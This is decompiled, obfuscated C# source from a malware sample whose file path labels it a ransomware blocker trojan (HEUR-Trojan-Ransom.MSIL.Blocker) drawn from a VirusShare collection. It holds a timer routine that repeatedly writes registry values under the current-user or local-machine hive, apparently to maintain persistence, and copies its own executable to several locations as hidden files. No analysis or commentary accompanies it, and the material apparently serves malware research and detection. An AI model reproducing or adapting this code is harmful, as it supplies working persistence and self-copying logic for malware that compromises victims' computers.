// Decompiled with JetBrains decompiler
// Type: .
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004;
using Microsoft.Win32;
using System.IO;
using System.Timers;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u000B\u000D
  {
    private static Timer \u0003\u0005\u0003\u000A\u0010 = new Timer();

    public static void \u0005\u000F()
    {
      \u000B\u000D.\u0003\u0005\u0003\u000A\u0010.Interval = (double) (\u000B\u0005\u0006\u000D\u0002\u0008.\u0004\u0007\u0010 * 1000);
      \u000B\u000D.\u0003\u0005\u0003\u000A\u0010.Elapsed += new ElapsedEventHandler(\u000B\u000D.\u0024MD\u002412);
      \u000B\u000D.\u0003\u0005\u0003\u000A\u0010.Start();
    }

    public static void \u0006\u000F()
    {
      \u000B\u000D.\u0003\u0005\u0003\u000A\u0010.Stop();
      \u000B\u000D.\u0003\u0005\u0003\u000A\u0010.Dispose();
    }

    private static void \u0024MD\u002412(object _param0, ElapsedEventArgs _param1)
    {
      RegistryKey registryKey1 = !\u000B\u0005\u0006\u000D\u0002\u0008.\u0011\u0002\u000C ? Registry.CurrentUser : Registry.LocalMachine;
      try
      {
        if (registryKey1.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001()) == null)
          registryKey1.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001());
        RegistryKey registryKey2 = registryKey1.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001(), true);
        if (registryKey2.Equals((object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0]))
        {
          if (registryKey2.GetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0]).ToString() != \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0])
            registryKey2.SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0]);
        }
        else
          registryKey2.SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0]);
      }
      catch
      {
      }
      try
      {
        if (registryKey1.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011()) == null)
          registryKey1.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011());
        RegistryKey registryKey3 = registryKey1.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011(), true);
        if (registryKey3.Equals((object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1]))
        {
          if (registryKey3.GetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1]).ToString() != \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1])
            registryKey3.SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1]);
        }
        else
          registryKey3.SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string str in \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006)
        {
          if (!\u000C\u000E.\u0024MD\u002422(str))
          {
            File.Copy(\u000B\u0005\u0006\u000D\u0002\u0008.\u000D\u0007\u0010\u0011\u000D\u0008, str);
            File.SetAttributes(str, FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
    }
  }
}
